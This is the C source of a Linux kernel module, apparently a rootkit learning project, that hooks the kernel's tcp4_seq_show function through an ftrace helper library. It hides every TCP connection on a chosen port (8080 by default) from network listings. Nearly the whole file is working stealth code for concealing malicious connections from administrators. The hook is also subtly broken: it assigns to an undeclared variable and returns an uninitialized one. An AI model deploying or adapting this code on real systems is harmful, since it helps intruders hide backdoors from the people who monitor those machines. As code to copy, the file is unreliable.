/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary library includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kallsyms.h>
#include "lib/ftrace_helper.h"

//setting up moudle information for kernel module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Kannanaikal");
MODULE_DESCRIPTION("Linux Kernel Hacking Hiding Ports");
MODULE_VERSION("0.01");

//function pointers system call kill
static asmlinkage long(*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/*
@param a sequence file struct and a void pointer
@return result success(0) failure(1)
This function hook will allow us to verify and hide any specific port we specify
*/
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
    struct inet_sock *inet_socket;
    long result;
    unsigned short port = htons(8080); //change this value to desired port you want to hide

    if (v != SEQ_START_TOKEN) {
		
		inet_socket = (struct inet_sock *)v;
		
		//if the source or destination port matches the desired port then don't output the corersponding port connection
		if (port == inet_socket->inet_sport || port == inet_socket->inet_dport) {
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return result;
}

//array for defining hooks according to xcellerators ftrace helper library function
static struct ftrace_hook hooks[] = {
		HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

//init function to run upon iitilaization of kernel module will install function hook
static int __init hide_ports_init(void){
	int error; 
	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(error){
		return error;
	}
	return 0;
}

//exit function to run upon removal of kernel module will uninstall function hooks
static void __exit hide_ports_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

//setting init and exit as corresponding functions for initalization and exit
module_init(hide_ports_init);
module_exit(hide_ports_exit);
